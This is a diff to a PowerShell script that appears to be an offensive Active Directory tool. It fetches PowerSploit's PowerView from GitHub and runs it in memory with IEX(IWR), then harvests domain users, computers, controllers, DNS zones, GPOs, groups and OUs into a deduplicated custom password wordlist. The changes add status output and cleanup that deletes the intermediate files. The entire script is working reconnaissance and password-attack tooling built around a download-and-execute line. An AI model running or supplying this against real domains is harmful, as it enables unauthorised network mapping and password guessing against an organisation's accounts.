@@ -5,6 +5,8 @@ param (
     [string]$Domain = $env:USERDNSDOMAIN
 )
 
+Write-Host "[INFO] Loading PowerView into memory" -ForegroundColor "Cyan"
+
 IEX(IWR -UseBasicParsing https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1)
 
 
@@ -14,11 +16,13 @@ $File = "CustomPasswordList.txt"
 $Final = "CustomPasswordListFinal.txt"
 $ErrorActionPreference = "Silentlycontinue"
 
+Write-Host "[INFO] Creating Empty file to be populated" -ForegroundColor "Cyan"
 
 New-Item -Name $File -Path $Path -ItemType "File" -Force | Out-Null
 Add-Content -Path $Path\$File -Value $null
 
 Function DomainUserProperties{
+Write-Host "[INFO] Gathering Domain User Properties" -ForegroundColor "Cyan"
 Get-DomainUser -Properties name -Domain $Domain | Select -ExpandProperty name | Add-Content -Path $Path\$File
 Get-DomainUser -Properties cn -Domain $Domain | Select -ExpandProperty cn | Add-Content -Path $Path\$File
 Get-DomainUser -Properties description -Domain $Domain | Select -ExpandProperty description | Add-Content -Path $Path\$File
@@ -32,7 +36,10 @@ Get-DomainUser -Properties serviceprincipalname  | Select -ExpandProperty servic
 
 }
 
+}
+
 Function DomainComputerProperties{
+Write-Host "[INFO] Gathering Domain Computer Properties" -ForegroundColor "Cyan"
 Get-DomainComputer -Properties name -Domain $Domain | Select -ExpandProperty name |Add-Content -Path $Path\$File
 Get-DomainComputer -Properties cn -Domain $Domain | Select -ExpandProperty cn | Add-Content -Path $Path\$File
 Get-DomainComputer -Properties description -Domain $Domain | Select -ExpandProperty description  | Add-Content -Path $Path\$File
@@ -43,6 +50,7 @@ Get-DomainComputer -Properties operatingsystem -Domain $Domain | Select -ExpandP
 }
 
 Function DomainControllerProperties{
+Write-Host "[INFO] Gathering Domain Controller Properties" -ForegroundColor "Cyan"
 Get-DomainController -Domain $Domain | Select -ExpandProperty OSVersion | Add-Content -Path $Path\$File
 Get-DomainController -Domain $Domain | Select -ExpandProperty Forest | Add-Content -Path $Path\$File
 Get-DomainController -Domain $Domain | Select -ExpandProperty Name | Add-Content -Path $Path\$File
@@ -51,6 +59,7 @@ Get-DomainController -Domain $Domain | Select -ExpandProperty IPAddress | Add-Co
 }
 
 Function DomainZoneProperties{
+Write-Host "[INFO] Gathering DNS Zone Properties" -ForegroundColor "Cyan"
 Get-DomainDNSZone -Domain $Domain | Select -ExpandProperty ZoneName | Add-Content -Path $Path\$File
 Get-DomainDNSZone -Domain $Domain| Select -ExpandProperty name | Add-Content -Path $Path\$File
 
@@ -58,12 +67,14 @@ Get-DomainDNSZone -Domain $Domain| Select -ExpandProperty name | Add-Content -Pa
 
 
 Function DomainGPOProperties{
+Write-Host "[INFO] Gathering Domain GPO Properties" -ForegroundColor "Cyan"
 Get-DomainGPO -Properties displayname -Domain $Domain | Select -ExpandProperty displayname |Add-Content -Path $Path\$File
 
 }
 
 
 Function DomainGroupProperties{
+Write-Host "[INFO] Gathering Domain Group Properties" -ForegroundColor "Cyan"
 Get-DomainGroup -Properties cn -Domain $Domain | Select -ExpandProperty cn |Add-Content -Path $Path\$File
 Get-DomainGroup -Properties samaccountname -Domain $Domain | Select -ExpandProperty samaccountname |Add-Content -Path $Path\$File
 Get-DomainGroup -Properties description -Domain $Domain | Select -ExpandProperty description |Add-Content -Path $Path\$File
@@ -73,14 +84,23 @@ Get-DomainGroup -Properties name -Domain $Domain | Select -ExpandProperty name |
 
 
 Function DomainOUProperties {
+Write-Host "[INFO] Gathering Domain OU Properties" -ForegroundColor "Cyan"
 Get-DomainOU -Properties ou -Domain $Domain  | Select -ExpandProperty ou |Add-Content -Path $Path\$File
 Get-DomainOU -Properties name -Domain $Domain  | Select -ExpandProperty name |Add-Content -Path $Path\$File
 
 }
 
+Function MiscProperties {
+Write-Host "[INFO] Gathering Domain Miscellaneous Properties" -ForegroundColor "Cyan"
+
+Add-Content -Value $env:USERDNSDOMAIN -Path $Path\$File
+Add-Content -Value $Domain -Path $Path\$File
+
+}
+
 # Execute each function
 
-
+Write-Host "[INFO] Executing script, this might take a while" -ForegroundColor "Cyan"
 DomainOUProperties
 DomainGroupProperties
 DomainGPOProperties
@@ -88,19 +108,20 @@ DomainZoneProperties
 DomainControllerProperties
 DomainComputerProperties
 DomainUserProperties
+MiscProperties
 
 Get-Content -Path $Path\$File | Sort | Get-Unique > $Path\$Final
 $OriginalFileCount = (Get-Content -Path $Path\$File).count
 $FinalFileLines = (Get-Content -Path $Path\$Final).count
+Start-Sleep -Seconds 1
+Remove-Item -Path $Path\$File -Force 
 Write-Host ""
-Write-Host ""
-Write-Host ""
-Write-Host "[INFO] Original File Has [$OriginalFileCount] Lines"
-Write-Host "[INFO] Removing Duplicate entries"
-Write-Host "[INFO] Final file has [$FinalFileLines] Lines"
-Write-Host "[INFO] Final file located at $Path\$Final"
+Write-Host "[INFO] Original File Has [$OriginalFileCount] Lines" -ForegroundColor "Cyan"
+Write-Host "[INFO] Removing Duplicate entries" -ForegroundColor "Cyan"
+Write-Host "[INFO] Final file has [$FinalFileLines] Lines" -ForegroundColor "Cyan"
+Write-Host "[INFO] Final file located at $Path\$Final" -ForegroundColor "Cyan"
 Start-Sleep -Milliseconds 1337
-If ($Console -eq "Y"){Get-Content -Path $Path\$Final}
+If ($Console -eq "Y"){Get-Content -Path $Path\$Final ; Remove-Item -Path $Path\$Final -Verbose }
 Write-Host ""
 Write-Host "[INFO] Script Execution Complete" -ForegroundColor "Green"
 
